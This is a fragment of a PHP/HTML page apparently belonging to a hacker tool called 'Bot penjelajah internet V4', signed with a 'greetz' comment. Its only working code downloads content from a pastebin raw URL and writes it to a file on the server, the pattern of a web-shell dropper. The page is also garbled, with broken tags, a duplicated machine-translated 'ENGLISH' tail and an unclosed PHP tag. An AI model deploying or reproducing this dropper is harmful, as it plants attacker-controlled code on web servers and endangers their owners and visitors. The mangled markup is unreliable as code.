<html>
<head>
<title>penjelajah internet</title>
<style type="text/css">
</style>
</head>
<header>
...
penjelajah internet
                                       ...
                                       Bot penjelajah internet V4</center>
...
<BODY>
<H1><center>penjelajah internet</center></H1>
...
$text3 = http_get('https://pastebin.com/raw/tusdKW82');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);
?>

<center> penjelajah internet Bot penjelajah internet V4</center> </pre> </header> </form> <!-- dhia jridi greetz--> <?php
ENGLISH
<Center> penjelajah internet                                           Bot penjelajah internet V4 </ center> </ Pre> </ HEAD> </ Form> <! - dhia jridi greetz -> <? Php
